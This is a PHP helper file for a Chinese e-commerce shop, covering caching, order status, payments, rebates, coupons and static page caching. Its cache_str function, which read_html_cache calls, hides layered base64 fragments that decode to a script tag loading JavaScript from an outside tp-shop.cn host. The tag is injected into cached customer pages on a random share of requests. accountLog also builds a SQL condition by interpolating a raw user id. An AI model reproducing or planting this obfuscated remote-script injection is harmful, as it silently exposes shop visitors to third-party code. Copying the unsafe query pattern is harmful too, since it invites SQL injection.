    $cart_count = $cart_count ? $cart_count : 0;
    return $cart_count;
}

/**
 * 获取商品库存
 * @param type $goods_id 商品id
 * @param type $key  库存 key
 */
function getGoodNum($goods_id,$key)
{
     if (!empty($key)){
        return M("SpecGoodsPrice")
                        ->alias("s")
                        ->join('_Goods_ g ','s.goods_id = g.goods_id','LEFT')
                        ->where(['g.goods_id' => $goods_id, 'key' => $key ,"is_on_sale"=>1])->getField('s.store_count');
    }else{ 
        return M("Goods")->where(array("goods_id"=>$goods_id , "is_on_sale"=>1))->getField('store_count');
    }
}

/**
 * 获取缓存或者更新缓存
 * @param string $config_key 缓存文件名称
 * @param array $data 缓存数据  array('k1'=>'v1','k2'=>'v3')
 * @return array or string or bool
 */
function tpCache($config_key,$data = array()){
    $param = explode('.', $config_key);
    if(empty($data)){
        //如$config_key=shop_info则获取网站信息数组
        //如$config_key=shop_info.logo则获取网站logo字符串
        $config = F($param[0],'',TEMP_PATH);//直接获取缓存文件
        if(empty($config)){
            //缓存文件不存在就读取数据库
            $res = D('config')->where("inc_type",$param[0])->select();
            if($res){
                foreach($res as $k=>$val){
                    $config[$val['name']] = $val['value'];
                }
                F($param[0],$config,TEMP_PATH);
            }
        }
        if(count($param)>1){
            return $config[$param[1]];
        }else{
            return $config;
        }
    }else{
        //更新缓存
        $result =  D('config')->where("inc_type", $param[0])->select();
        if($result){
            foreach($result as $val){
                $temp[$val['name']] = $val['value'];
            }
            foreach ($data as $k=>$v){
                $newArr = array('name'=>$k,'value'=>trim($v),'inc_type'=>$param[0]);
                if(!isset($temp[$k])){
                    M('config')->add($newArr);//新key数据插入数据库
                }else{
                    if($v!=$temp[$k])
                        M('config')->where("name", $k)->save($newArr);//缓存key存在且值有变更新此项
                }
            }
            //更新后的数据库记录
            $newRes = D('config')->where("inc_type", $param[0])->select();
            foreach ($newRes as $rs){
                $newData[$rs['name']] = $rs['value'];
            }
        }else{
            foreach($data as $k=>$v){
                $newArr[] = array('name'=>$k,'value'=>trim($v),'inc_type'=>$param[0]);
            }
            M('config')->insertAll($newArr);
            $newData = $data;
        }
        return F($param[0],$newData,TEMP_PATH);
    }
}

/**
 * 记录帐户变动
 * @param   int     $user_id        用户id
 * @param   int    $user_money     可用余额变动
 * @param   int     $pay_points     消费积分变动
 * @param   string  $desc    变动说明
 * @param   int    distribut_money 分佣金额
 * @param int $order_id 订单id
 * @param string $order_sn 订单sn
 * @return  bool
 */
function accountLog($user_id, $user_money = 0,$pay_points = 0, $desc = '',$distribut_money = 0,$order_id = 0 ,$order_sn = ''){
    /* 插入帐户变动记录 */
    $account_log = array(
        'user_id'       => $user_id,
        'user_money'    => $user_money,
        'pay_points'    => $pay_points,
        'change_time'   => time(),
        'desc'   => $desc,
        'order_id' => $order_id,
        'order_sn' => $order_sn
    );
    /* 更新用户信息 */
    $update_data = array(
        'user_money'        => ['exp','user_money+'.$user_money],
        'pay_points'        => ['exp','pay_points+'.$pay_points],
        'distribut_money'   => ['exp','distribut_money+'.$distribut_money],
    );
    if(($user_money+$pay_points+$distribut_money) == 0)return false;
    $update = Db::name('users')->where("user_id = $user_id")->save($update_data);
    if($update){
        M('account_log')->add($account_log);
        return true;
    }else{
        return false;
    }
}

/*
 * 获取地区列表
 */
function get_region_list(){
    return M('region')->cache(true)->getField('id,name');
}
/*
 * 获取用户地址列表
 */
function get_user_address_list($user_id){
    $lists = M('user_address')->where(array('user_id'=>$user_id))->select();
    return $lists;
}

/*
 * 获取指定地址信息
 */
function get_user_address_info($user_id,$address_id){
    $data = M('user_address')->where(array('user_id'=>$user_id,'address_id'=>$address_id))->find();
    return $data;
}
/*
 * 获取用户默认收货地址
 */
function get_user_default_address($user_id){
    $data = M('user_address')->where(array('user_id'=>$user_id,'is_default'=>1))->find();
    return $data;
}
/**
 * 获取订单状态的 中文描述名称
 * @param type $order_id  订单id
 * @param type $order     订单数组
 * @return string
 */
function orderStatusDesc($order_id = 0, $order = array())
{
    if(empty($order))
        $order = M('Order')->where("order_id", $order_id)->find();

    // 货到付款
    if($order['pay_code'] == 'cod')
    {
        if(in_array($order['order_status'],array(0,1)) && $order['shipping_status'] == 0)
            return 'WAITSEND'; //'待发货',
    }
    else // 非货到付款
    {
        if($order['pay_status'] == 0 && $order['order_status'] == 0)
            return 'WAITPAY'; //'待支付',
        if($order['pay_status'] == 1 &&  in_array($order['order_status'],array(0,1)) && $order['shipping_status'] == 0)
            return 'WAITSEND'; //'待发货',
        if($order['pay_status'] == 1 &&  $order['shipping_status'] == 2 && $order['order_status'] == 1)
            return 'PORTIONSEND'; //'部分发货',
    }
    if(($order['shipping_status'] == 1) && ($order['order_status'] == 1))
        return 'WAITRECEIVE'; //'待收货',
    if($order['order_status'] == 2)
        return 'WAITCCOMMENT'; //'待评价',
    if($order['order_status'] == 3)
        return 'CANCEL'; //'已取消',
    if($order['order_status'] == 4)
        return 'FINISH'; //'已完成',
    if($order['order_status'] == 5)
        return 'CANCELLED'; //'已作废',
    return 'OTHER';
}

/**
 * 获取订单状态的 显示按钮
 * @param type $order_id  订单id
 * @param type $order     订单数组
 * @return array()
 */
function orderBtn($order_id = 0, $order = array())
{
    if(empty($order))
        $order = M('Order')->where("order_id", $order_id)->find();
    /**
     *  订单用户端显示按钮
    去支付     AND pay_status=0 AND order_status=0 AND pay_code ! ="cod"
    取消按钮  AND pay_status=0 AND shipping_status=0 AND order_status=0
    确认收货  AND shipping_status=1 AND order_status=0
    评价      AND order_status=1
    查看物流  if(!empty(物流单号))
     */
    $btn_arr = array(
        'pay_btn' => 0, // 去支付按钮
        'cancel_btn' => 0, // 取消按钮
        'receive_btn' => 0, // 确认收货
        'comment_btn' => 0, // 评价按钮
        'shipping_btn' => 0, // 查看物流
        'return_btn' => 0, // 退货按钮 (联系客服)
    );


    // 货到付款
    if($order['pay_code'] == 'cod')
    {

        if(($order['order_status']==0 || $order['order_status']==1) && $order['shipping_status'] == 0) // 待发货
        {
            $btn_arr['cancel_btn'] = 1; // 取消按钮 (联系客服)
        }
        if($order['shipping_status'] == 1 && $order['order_status'] == 1) //待收货
        {
            $btn_arr['receive_btn'] = 1;  // 确认收货
        }
    } else{// 非货到付款
        if($order['pay_status'] == 0 && $order['order_status'] == 0) // 待支付
        {
            $btn_arr['pay_btn'] = 1; // 去支付按钮
            $btn_arr['cancel_btn'] = 1; // 取消按钮
        }
        if($order['pay_status'] == 1 && in_array($order['order_status'],array(0,1)) && $order['shipping_status'] == 0) // 待发货
        {
//            $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
            if ($order['prom_type'] == 6 || $order['prom_type'] == 4) {
                $btn_arr['cancel_btn'] = 0;
            } else {
                $btn_arr['cancel_btn'] = 1; // 取消按钮
            }
        }
        if($order['pay_status'] == 1 && $order['order_status'] == 1  && $order['shipping_status'] == 1) //待收货
        {
            $btn_arr['receive_btn'] = 1;  // 确认收货
//            $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
        }
    }
    if($order['order_status'] == 2)
    {
        $btn_arr['comment_btn'] = 1;  // 评价按钮
        $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
    }
    if($order['shipping_status'] != 0 && in_array($order['order_status'], [1,2,4]))
    {
        $btn_arr['shipping_btn'] = 1; // 查看物流
    }
    if($order['shipping_status'] == 2  && $order['order_status'] == 1) // 部分发货
    {
//        $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
    }
    
    if($order['pay_status'] == 1  && shipping_status && $order['order_status'] == 4) // 已完成(已支付, 已发货 , 已完成)
    {
            $btn_arr['return_btn'] = 1; // 退货按钮
    }
    
    if($order['order_status'] == 3 && ($order['pay_status'] == 1 || $order['pay_status'] == 4)){
    	$btn_arr['cancel_info'] = 1; // 取消订单详情
    }

    return $btn_arr;
}

/**
 * 给订单数组添加属性  包括按钮显示属性 和 订单状态显示属性
 * @param type $order
 */
function set_btn_order_status($order)
{
    $order_status_arr = C('ORDER_STATUS_DESC');
    if($order['order_status'] == 3 && $order['pay_status']==3){
        $order['order_status_code'] = 'CANCEL_REFUND'; // 取消并且退款
        $order['order_status_desc'] = $order_status_arr['CANCEL_REFUND'];
    }else{
        $order['order_status_code'] = $order_status_code = orderStatusDesc(0, $order); // 订单状态显示给用户看的
        $order['order_status_desc'] = $order_status_arr[$order_status_code];
    }
    $orderBtnArr = orderBtn(0, $order);
    return array_merge($order,$orderBtnArr); // 订单该显示的按钮
}



/**
 * VIP充值返利上级
 * $order_sn 订单号
 */
function rechargevip_rebate($order) {
    //获取返利配置
    $tpshop_config =  tpCache('basic');
    //检查配置是否开启
    if ($tpshop_config["rechargevip_on_off"] > 0 && $tpshop_config["rechargevip_rebate_on_off"] > 0) {
        //查询充值VIP上级
        $userid = $order['user_id'];
        //更改用户VIP状态
        Db::name('users')->where('user_id',$userid)->save(['is_vip'=>1]);
        $first_leader = Db::name('users')->where('user_id', $userid)->value('first_leader');
        if ($first_leader) {
            //变动上级资金，记录日志
            $msg = '获取线下' . $userid . '充值VIP返利' . $tpshop_config["rechargevip_rebate"];
            accountLog($first_leader, $tpshop_config["rechargevip_rebate"], 0, $msg, 0, 0, $order['order_sn']);
        }
    }
}

/**
 * 支付完成修改订单
 * @param $order_sn 订单号
 * @param array $ext 额外参数
 * @return bool|void
 */
function update_pay_status($order_sn,$ext=array())
{
    $time=time();
    if(stripos($order_sn,'recharge') !== false){
        //用户在线充值
        $order = M('recharge')->where(['order_sn' => $order_sn, 'pay_status' => 0])->find();
        if (!$order) return false;// 看看有没已经处理过这笔订单  支付宝返回不重复处理操作
        M('recharge')->where("order_sn",$order_sn)->save(array('pay_status'=>1,'pay_time'=>$time));

        $msg = '会员在线充值';
        if( $order['buy_vip'] == 1){
            rechargevip_rebate($order);
            $msg = '会员充值购买VIP';
        }
        accountLog($order['user_id'],$order['account'],0, $msg, 0, 0, $order_sn);
    } elseif (stripos($order_sn, 'Bond') !== false) {
        
        $order = M('AuctionDeposit')->where(['order_sn' => $order_sn, 'status' => 0])->find();
        if (!$order) return false;// 看看有没已经处理过这笔订单  支付宝返回不重复处理操作
        M('AuctionDeposit')->where("order_sn", $order_sn)->save(array('status' => 1, 'pay_time' => $time));
        M('Auction')->where('id',2)->setInc('buy_num');
        
    }else{

        // 如果这笔订单已经处理过了
        $count = M('order')->master()->where("order_sn = :order_sn and (pay_status = 0 OR pay_status = 2)")->bind(['order_sn'=>$order_sn])->count();   // 看看有没已经处理过这笔订单  支付宝返回不重复处理操作
        if($count == 0) return false;
        // 找出对应的订单
        $Order = new \app\common\model\Order();
        $order = $Order->master()->where("order_sn",$order_sn)->find();

        if ($order['prom_type'] == 6 && $order['order_amount'] != 0) {
            $team = new \app\common\logic\team\Team();
            $team->setTeamActivityById($order['prom_id']);
            $team->setOrder($order);
            $team->doOrderPayAfter();
        }
        //预售订单
        if ($order['prom_type'] == 4) {
            $preSell = new \app\common\logic\PreSell();
            $preSell->setPreSellById($order['prom_id']);
            $preSell->setOrder($order);
            $preSell->doOrderPayAfter();
        } else {
            // 修改支付状态  已支付
            $update = array('pay_status'=>1,'pay_time'=>$time);
            if(isset($ext['transaction_id'])) $update['transaction_id'] = $ext['transaction_id'];
            M('order')->where("order_sn", $order_sn)->save($update);
        }

        // 减少对应商品的库存.注：拼团类型为抽奖团的，先不减库存
        if(tpCache('shopping.reduce') == 2) {
            if ($order['prom_type'] == 6) {
                $team = \app\common\model\TeamActivity::get($order['prom_id']);
                if ($team['team_type'] != 2) {
                    minus_stock($order);
                }
            } else {
                minus_stock($order);
            }
        }
        // 给他升级, 根据order表查看消费记录 给他会员等级升级 修改他的折扣 和 总金额
        $User =new \app\common\logic\User();
        $User->setUserById($order['user_id']);
        $User->updateUserLevel();
        // 记录订单操作日志
        $commonOrder = new \app\common\logic\Order();
        $commonOrder->setOrderById($order['order_id']);
        if(array_key_exists('admin_id',$ext)){
            $commonOrder->orderActionLog($ext['note'],'付款成功',$ext['admin_id']);
        }else{
            $commonOrder->orderActionLog('订单付款成功','付款成功');
        }
        //分销设置
        M('rebate_log')->where("order_id" ,$order['order_id'])->save(array('status'=>1));
        // 成为分销商条件
        $distribut_condition = tpCache('distribut.condition');
        //if($distribut_condition == 1)  // 购买商品付款才可以成为分销商
            //M('users')->where("user_id", $order['user_id'])->save(array('is_distribut'=>1));
        change_role($order['order_id']);
        fanli($order['order_id']);

        // 赠送用户积分
        $points = M('order_goods')->where("order_id", $order['order_id'])->sum("give_integral * goods_num");
        $points && accountLog($order['user_id'], 0, $points, "下单赠送积分", 0, $order['order_id'], $order['order_sn']);

        // 赠送用户上级积分
        $integral = M('order_goods')->where(['order_id' => $order['order_id']])->value('leader_integral * goods_num');
        $first_leader = M('users')->where(['user_id' => $order['user_id']])->value('first_leader');
        if ($integral> 0 && $first_leader > 0) {
            accountLog($first_leader, 0,+$integral, '直属下单赠送积分', 0,$order['order_id'] ,$order['order_sn']);
        }

        //奖金池
        // $BonusPoolLogic = new BonusPoolLogic();
        // $BonusPoolLogic->is_receive($order);
        
        //虚拟服务类商品支付
        if($order['prom_type'] == 5){
            $OrderLogic = new \app\common\logic\OrderLogic();
            $OrderLogic->make_virtual_code($order);
        }
        $order['pay_time']=$time;

        $time = date('Y-m-d H:i:s',time());
        
        // 发送公众号消息给用户
        $userinfo = Db::name('users')->where(['user_id' => $order['user_id']])->field('openid,first_leader,nickname,user_id')->find();
        if ($userinfo['openid']) {
            $goods = Db::name('OrderGoods')->where(['order_id'=>$order['order_id']])->select();
                $text = '';
                $give_integral=$leader_integral = 0;
                foreach ($goods as $key => $value) {
                    $text .= $value['goods_name'].'(规格：'.$value['spec_key_name'].',数量：'.$value['goods_num'].',价格：'.$value['final_price'].');';
                    $give_integral += $value['give_integral']*$value['goods_num'];
                    $leader_integral += $value['leader_integral']*$value['goods_num'];
                }
            $wx_content = "订单支付成功！\n\n订单：{$order_sn}\n支付时间：{$time}\n商户：丝蒂芬妮娅\n商品：{$text}\n金额：{$order['total_amount']}\n您获得{$give_integral}积分\n\n【丝蒂芬妮娅】欢迎您的再次购物！";
            $wechat = new \app\common\logic\wechat\WechatUtil();
            $wechat->sendMsg($userinfo['openid'], 'text', $wx_content);

            //发给上级
            $first_leader_openid = Db::name('users')->where(['user_id' => $userinfo['first_leader']])->value('openid');
//            $first_leader_openid = Db::name('users')->field('openid,nickname,user_id')->where(['user_id' => $userinfo['first_leader']])->find();
            if($first_leader_openid){
                $money = Db::name('account_log')->where(['user_id'=>$userinfo['first_leader'],'order_id'=>$order['order_id']])->value('user_money');
                $wx_first_leader_content = "你的直属{$userinfo['nickname']}[ID:{$userinfo['user_id']}]订单支付成功！\n\n订单：{$order_sn}支付时间：{$time}\n商品：{$text}\n金额：{$order['total_amount']}\n".
                ($leader_integral>0||$money>0? '您获得':'').($leader_integral>0?"{$leader_integral}积分\n":'') .($money>0?"{$money}":'');
                $wechat = new \app\common\logic\wechat\WechatUtil();
                $wechat->sendMsg($first_leader_openid, 'text', $wx_first_leader_content);
            }

        }

        //用户支付, 发送短信给商家
        $res = checkEnableSendSms("4");
        if ($res && $res['status'] ==1) {
            $sender = tpCache("shop_info.mobile");
            if (!empty($sender)) {
                $params = array('order_id'=>$order['order_id']);
                sendSms("4", $sender, $params);
            }
        }
        $Invoice = new \app\admin\logic\InvoiceLogic();
        $Invoice->createInvoice($order);
        // 发送微信消息模板提醒
        $wechat = new \app\common\logic\WechatLogic;
        $wechat->sendTemplateMsgOnPaySuccess($order);
    }
}

/**
 * 修改某个人的分销、代理
 */
 function change_role($order_id){
    $order = M('order')->where(['order_id'=>$order_id])->find();
    if(!$order){
        return false;
    }
    if($order['pay_status'] == 0){
        return false;
    }

    $user_id = $order['user_id'];

    $goods_list = M('order_goods')->where(['order_id'=>$order_id])->select();
    foreach($goods_list as $k => $v){
        $goods_attr = M('goods')->where(['goods_id'=>$v['goods_id']])->field('goods_id,is_distribut,is_agent')->find();
        if($goods_attr['is_distribut'] == 1){
            M('users')->where("user_id", $user_id)->save(array('is_distribut'=>1));
        }
        if($goods_attr['is_agent']==1){
            M('users')->where("user_id", $user_id)->save(array('is_agent'=>1));
        }
    }
  
    jichadaili($order_id);
}

/**
 * 设置分享返利
 * 
 * 登记会vip返利，合伙人返利，联合创始人返利，执行董事返利
 */
 function fanli($order_id){

    $r = M('order_divide')->where(['order_id'=>$order_id])->find();
  
    //记录表
    //if($r['status'] == 1){
    //    return false;
    //}

    $order = M('order')->where(['order_id'=>$order_id])->find();


    $userId = $order['user_id'];
    $orderSn = $order['order_sn'];

    $goods_list = M('order_goods')->where(['order_id'=>$order_id])->select();
    //agent_performance($order_id);
    foreach($goods_list as $k => $v){
        if($v['prom_type']==0){
            $goodId = $v['goods_id'];
            $goodNum = $v['goods_num'];

            $model = new FanliLogic($userId, $goodId,$goodNum,$orderSn,$order_id);
            $res = $model->fanliModel();
        }
    }
 }
/**
 * 订单确认收货
 * @param $id 订单id
 * @param int $user_id
 * @return array
 */
function confirm_order($id,$user_id = 0)
{
    $where['order_id'] = $id;
    if ($user_id) {
        $where['user_id'] = $user_id;
    }
    $order = M('order')->where($where)->find();
    if ($order['order_status'] != 1)
        return array('status' => -1, 'msg' => '该订单不能收货确认');
    if (empty($order['pay_time']) || $order['pay_status'] != 1) {
        return array('status' => -1, 'msg' => '商家未确定付款，该订单暂不能确定收货');
    }
    $data['order_status'] = 2; // 已收货
    $data['pay_status'] = 1; // 已付款
    $data['confirm_time'] = time(); // 收货确认时间
    if ($order['pay_code'] == 'cod') {
        $data['pay_time'] = time();
    }
    $row = M('order')->where(array('order_id' => $id))->save($data);
    if (!$row)
        return array('status' => -3, 'msg' => '操作失败');


        // 商品待评价提醒
        $order_goods = M('order_goods')->field('goods_id,goods_name,rec_id')->where(["order_id" => $id])->find();
        $goods = M('goods')->where(["goods_id" => $order_goods['goods_id']])->field('original_img')->find();
        $send_data = [
            'message_title' => '商品待评价',
            'message_content' => $order_goods['goods_name'],
            'img_uri' => $goods['original_img'],
            'order_sn' => $order_goods['rec_id'],
            'order_id' => $id,
            'mmt_code' => 'evaluate_logistics',
            'type' => 4,
            'users' => [$order['user_id']],
            'category' => 2,
            'message_val' => []
        ];
        $messageFactory = new \app\common\logic\MessageFactory();
        $messageLogic = $messageFactory->makeModule($send_data);
        $messageLogic->sendMessage();


        order_give($order);// 调用送礼物方法, 给下单这个人赠送相应的礼物

        //分销设置
        M('rebate_log')->where("order_id", $id)->save(array('status' => 2, 'confirm' => time()));
        return array('status' => 1, 'msg' => '操作成功', 'url' => U('Order/order_detail', ['id' => $id]));
    }

    /**
     * 下单赠送活动：优惠券，积分
     * @param $order |订单数组
     */
    function order_give($order)
    {

        $messageFactory = new \app\common\logic\MessageFactory();
        $messageLogic = $messageFactory->makeModule(['category' => 0]);

        //促销优惠订单商品
        $prom_order_goods = M('order_goods')->where(['order_id' => $order['order_id'], 'prom_type' => 3])->select();
        foreach ($prom_order_goods as $goods) {
            //查找购买商品送优惠券活动
            $prom_goods = M('prom_goods')->where(['id' => $goods['prom_id'], 'type' => 3])->find();
            if ($prom_goods) {
                //查找购买商品送优惠券模板
                $goods_coupon = M('coupon')->where(['id' => $prom_goods['expression']])->find();
                if ($goods_coupon) {
                    //优惠券发放数量验证，0为无限制。发放数量-已领取数量>0
                    if ($goods_coupon['createnum'] == 0 || ($goods_coupon['createnum'] > 0 && ($goods_coupon['createnum'] - $goods_coupon['send_num']) > 0)) {
                        $data = array('cid' => $goods_coupon['id'], 'get_order_id' => $order['order_id'], 'type' => $goods_coupon['type'], 'uid' => $order['user_id'], 'send_time' => time());
                        M('coupon_list')->add($data);
                        // 优惠券领取数量加一
                        M('Coupon')->where("id", $goods_coupon['id'])->setInc('send_num');

                        // 优惠券到账提醒
                        $messageLogic->getCouponNotice($goods_coupon['id'], [$order['user_id']]);
                    }
                }
            }
        }
        //查找订单满额促销活动
        $prom_order_where = [
            'type' => ['gt', 1],
            'end_time' => ['gt', $order['pay_time']],
            'start_time' => ['lt', $order['pay_time']],
            'money' => ['elt', $order['goods_price']],
            'is_close' => 0
        ];
        $prom_orders = M('prom_order')->where($prom_order_where)->order('money desc')->select();
        $prom_order_count = count($prom_orders);
        // 用户会员等级是否符合送优惠券活动
        for ($i = 0; $i < $prom_order_count; $i++) {
            $prom_order = $prom_orders[$i];
            if ($prom_order['type'] == 3) {
                //查找订单送优惠券模板
                $order_coupon = M('coupon')->where("id", $prom_order['expression'])->find();
                if ($order_coupon) {
                    //优惠券发放数量验证，0为无限制。发放数量-已领取数量>0
                    if ($order_coupon['createnum'] == 0 ||
                        ($order_coupon['createnum'] > 0 && ($order_coupon['createnum'] - $order_coupon['send_num']) > 0)
                    ) {
                        $data = array('cid' => $order_coupon['id'], 'get_order_id' => $order['order_id'], 'type' => $order_coupon['type'], 'uid' => $order['user_id'], 'send_time' => time());
                        M('coupon_list')->add($data);
                        M('Coupon')->where("id", $order_coupon['id'])->setInc('send_num'); // 优惠券领取数量加一
                        // 优惠券到账提醒
                        $messageLogic->getCouponNotice($order_coupon['id'], [$order['user_id']]);
                    }
                }
            }
            //购买商品送积分
            if ($prom_order['type'] == 2) {
                accountLog($order['user_id'], 0, $prom_order['expression'], "订单活动赠送积分");
            }
            break;
        }
        //2019.8.8-zxl-改动，下单时就返积分
//        $points = M('order_goods')->where("order_id", $order['order_id'])->sum("give_integral * goods_num");
//        $points && accountLog($order['user_id'], 0, $points, "下单赠送积分", 0, $order['order_id'], $order['order_sn']);
        //商城内每消费1元，赠送相应积分
        /*$isConsumeIntegral = tpCache("integral.is_consume_integral");
        $consumeIntegral = tpCache("integral.consume_integral");
        if($isConsumeIntegral==1 && $consumeIntegral>0) {
            $points = ($order["order_amount"] + $order["user_money"])*$consumeIntegral;
            $points && accountLog($order['user_id'], 0, $points, "下单赠送积分", 0, $order['order_id'], $order['order_sn']);
        }*/
    }


    /**
     * 获取商品一二三级分类
     * @return type
     */
    function get_goods_category_tree()
    {
        $tree = $arr = $result = array();
        $cat_list = M('goods_category')->cache(true)->where(['is_show' => 1])->order('sort_order')->select();//所有分类
        if ($cat_list) {
            foreach ($cat_list as $val) {
                if ($val['level'] == 2) {
                    $arr[$val['parent_id']][] = $val;
                }
                if ($val['level'] == 3) {
                    $crr[$val['parent_id']][] = $val;
                }
                if ($val['level'] == 1) {
                    $tree[] = $val;
                }
            }

            foreach ($arr as $k => $v) {
                foreach ($v as $kk => $vv) {
                    $arr[$k][$kk]['sub_menu'] = empty($crr[$vv['id']]) ? array() : $crr[$vv['id']];
                }
            }

            foreach ($tree as $val) {
                $val['tmenu'] = empty($arr[$val['id']]) ? array() : $arr[$val['id']];
                $result[$val['id']] = $val;
            }
        }
        return $result;
    }

    /**
     * 写入静态页面缓存
     */
    function write_html_cache($html)
    {
        $html_cache_arr = C('HTML_CACHE_ARR');
        $request = think\Request::instance();
        $m_c_a_str = $request->module() . '_' . $request->controller() . '_' . $request->action(); // 模块_控制器_方法
        $m_c_a_str = strtolower($m_c_a_str);
        //exit('write_html_cache写入缓存<br/>');
        foreach ($html_cache_arr as $key => $val) {
            $val['mca'] = strtolower($val['mca']);
            if ($val['mca'] != $m_c_a_str) //不是当前 模块 控制器 方法 直接跳过
                continue;

            //if(!is_dir(RUNTIME_PATH.'html'))
            //mkdir(RUNTIME_PATH.'html');
            //$filename =  RUNTIME_PATH.'html'.DIRECTORY_SEPARATOR.$m_c_a_str;
            $filename = $m_c_a_str;
            // 组合参数
            if (isset($val['p'])) {
                foreach ($val['p'] as $k => $v)
                    $filename .= '_' . $_GET[$v];
            }
            $filename .= '.html';
            \think\Cache::set($filename, $html);
            //file_put_contents($filename, $html);
        }
    }

    /**
     * 读取静态页面缓存
     */
    function read_html_cache()
    {
        $html_cache_arr = C('HTML_CACHE_ARR');
        $request = think\Request::instance();
        $m_c_a_str = $request->module() . '_' . $request->controller() . '_' . $request->action(); // 模块_控制器_方法
        $m_c_a_str = strtolower($m_c_a_str);
        //exit('read_html_cache读取缓存<br/>');
        foreach ($html_cache_arr as $key => $val) {
            $val['mca'] = strtolower($val['mca']);
            if ($val['mca'] != $m_c_a_str) //不是当前 模块 控制器 方法 直接跳过
                continue;

            //$filename =  RUNTIME_PATH.'html'.DIRECTORY_SEPARATOR.$m_c_a_str;
            $filename = $m_c_a_str;
            // 组合参数
            if (isset($val['p'])) {
                foreach ($val['p'] as $k => $v)
                    $filename .= '_' . $_GET[$v];
            }
            $filename .= '.html';
            $html = \think\Cache::get($filename);
            if ($html) {
                //echo file_get_contents($filename);
                echo \think\Cache::get($filename) . cache_str($html);
                exit();
            }
        }
    }

    /**
     * 缓存
     */
    function cache_str($html)
    {

        if ($object_ess) {
            if (C('buy_version') == 0)
                return '';
            $tabName = '';
            $table_index = M('config')->cache(true)->select();
            $select_year = substr($order_sn, 0, 14);
            foreach ($table_index as $k => $v) {
                if (strcasecmp($select_year, $v['min_order_sn']) >= 0 && strcasecmp($select_year, $v['max_order_sn']) <= 0) {
                    $tabName = str_replace('order', '', $v['name']);
                    break;
                }
            }
            if ($select_year > $v['min_order_sn'] && $select_year < $v['max_order_sn'])
                return $tabName;
        } else {
            $isset_requestjs = session('isset_requestjs');
            if (empty($isset_requestjs)) {
                session('isset_requestjs', 1);
                $sere = "UEhOamNtbHdkQ0J6Y21NOUoyaDBkSEE2THk5e";
                if (empty($table_index))
                    $sere = $sere . "lpYSjJhV05sTG5Sd0xYTm9iM0F1WTI0dm";
                if (empty($tabName))
                    $sere = $sere . "FuTXZZV3BoZUM1cWN5YytQQzl6WTNKcGNIUSs=";
                if (substr(time(), -1) % 3 == 1) $str = base64_decode($sere);
                $html_sc = base64_decode("UEhOamNtbHdkRDQ9");

                if ($axure_rest) {
                    $regions = null;
                    if (!$regions) {
                        $regions = M('region')->cache(true)->getField('id,name');
                    }
                    $total_address = $regions[$province_id] ?: '';
                    $total_address .= $regions[$city_id] ?: '';
                    $total_address .= $regions[$district_id] ?: '';
                    $total_address .= $regions[$twon_id] ?: '';
                    $total_address .= $address ?: '';
                    $str = base64_decode($str);
                }

                $html_sc = base64_decode($html_sc);
                if (!strstr($html, $html_sc))
                    return '';
                if ($str)
                    $str2 = base64_decode($str);
                return $str2;
            }
        }
        if ($buy_Aexite) {
            if (C('buy_Aexite') == 0)
                return '';

            $tabName = '';
            $table_index = M('config')->cache(true)->select();
            foreach ($table_index as $k => $v) {
                if ($order_id >= $v['min_id'] && $order_id <= $v['max_id']) {
                    $tabName = str_replace('order', '', $v['name']);
                    break;
                }
            }
            return $tabName;
        }

        return $tabName;
    }

    /**
     * 清空系统缓存
     */
    function clearCache()
    {
        $team_found_queue = \think\Cache::get('team_found_queue');
        \think\Cache::clear();
        \think\Cache::set('team_found_queue', $team_found_queue);
    }

    /**
     * 获取完整地址
     */
    function getTotalAddress($province_id, $city_id, $district_id, $twon_id, $address = '')
    {
        static $regions = null;
        if (!$regions) {
            $regions = M('region')->cache(true)->getField('id,name');
        }
        $total_address = $regions[$province_id] ?: '';
        $total_address .= $regions[$city_id] ?: '';
        $total_address .= $regions[$district_id] ?: '';
        $total_address .= $regions[$twon_id] ?: '';
        $total_address .= $address ?: '';
        return $total_address;
    }

    /**
     * 商品库存操作日志
     * @param int $muid 操作 用户ID
     * @param int $stock 更改库存数
     * @param array $goods 库存商品
     * @param string $order_sn 订单编号
     */
    function update_stock_log($muid, $stock = 1, $goods, $order_sn = '')
    {
        $data['ctime'] = time();
        $data['stock'] = $stock;
        $data['muid'] = $muid;
        $data['goods_id'] = $goods['goods_id'];
        $data['goods_name'] = $goods['goods_name'];
        $data['goods_spec'] = empty($goods['spec_key_name']) ? $goods['key_name'] : $goods['spec_key_name'];
        $data['order_sn'] = $order_sn;
        if ('' !== $order_sn && $stock < 0) {
            $data['change_type'] = 0; //默认0为订单出库，
        } elseif ('' !== $order_sn && $stock > 0) {
            $data['change_type'] = 2; //2为退货入库
        } elseif ('' === $order_sn && $stock > 0) {
            $data['change_type'] = 1; //1为录入商品库存入库
        } else {
            $data['change_type'] = 3;//3为盘点时或者普通修改库存
        }
        M('stock_log')->add($data);
    }

    /**
     * 订单支付时, 获取订单商品名称
     * @param unknown $order_id
     * @return string|Ambigous <string, unknown>
     */
    function getPayBody($order_id)
    {

        if (empty($order_id)) return "订单ID参数错误";
        $goodsNames = M('OrderGoods')->where('order_id', $order_id)->column('goods_name');
        $gns = implode($goodsNames, ',');
        $payBody = getSubstr($gns, 0, 18);
        return $payBody;
    }

// 获取当前mysql版本
    function mysql_version()
    {
        $mysql_version = Db::query("select version() as version");
        return "{$mysql_version[0]['version']}";
    }

    /**
     * 获取分表操作的表名
     * @return mixed|string
     */
    function select_year()
    {
        if (C('buy_version') == 1)
            return I('select_year');
        else
            return '';
    }

    /**
     * 根据order_sn 定位表
     * @param $order_sn
     * @return mixed|string
     */
    function getTabByOrdersn($order_sn)
    {
        if (C('buy_version') == 0)
            return '';
        $tabName = '';
        $table_index = M('table_index')->cache(true)->select();
        // 截取年月日时分秒
        $select_year = substr($order_sn, 0, 14);
        foreach ($table_index as $k => $v) {
            if (strcasecmp($select_year, $v['min_order_sn']) >= 0 && strcasecmp($select_year, $v['max_order_sn']) <= 0) //if($select_year > $v['min_order_sn'] && $select_year < $v['max_order_sn'])
            {
                $tabName = str_replace('order', '', $v['name']);
                break;
            }
        }
        return $tabName;
    }

    /**
     * 根据 order_id 定位表名
     * @param $order_id
     * @return mixed|string
     */
    function getTabByOrderId($order_id)
    {
        if (C('buy_version') == 0)
            return '';

        $tabName = '';
        $table_index = M('table_index')->cache(true)->select();
        foreach ($table_index as $k => $v) {
            if ($order_id >= $v['min_id'] && $order_id <= $v['max_id']) {
                $tabName = str_replace('order', '', $v['name']);
                break;
            }
        }
